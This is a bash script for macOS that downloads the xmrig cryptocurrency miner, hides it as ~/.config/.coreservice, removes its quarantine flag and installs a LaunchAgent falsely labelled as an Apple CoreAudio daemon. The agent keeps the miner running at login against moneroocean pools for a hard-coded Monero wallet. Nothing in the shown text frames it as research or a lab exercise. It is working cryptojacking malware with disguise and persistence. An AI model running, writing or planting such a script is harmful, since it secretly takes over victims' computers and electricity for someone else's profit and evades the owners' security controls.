#!/bin/bash
set -e

f="com.apple.coreaudio.daemon.plist"
b="$HOME/.config/.coreservice"

# Determine architecture and download appropriate xmrig binary
ARCH=$(uname -m)
if [[ "$ARCH" == "arm64" ]]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-arm64.tar.gz"
else
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz"
fi

# Download xmrig directly
mkdir -p ~/.config
curl -fsSL "$URL" | tar -xz -C ~/.config
mv ~/.config/xmrig-6.21.0/xmrig "$b"
chmod +x "$b"

# Remove quarantine attributes if they exist
xattr -d com.apple.quarantine "$b" 2>/dev/null

# Create LaunchAgent plist
cat <<EOF > "$f"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.coreaudio.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF --tls -t 1; fi; sleep 60; done</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

mkdir -p ~/Library/LaunchAgents
mv "$f" ~/Library/LaunchAgents/

# Load LaunchAgent and handle potential permission issues
launchctl load ~/Library/LaunchAgents/"$f" >/dev/null 2>&1
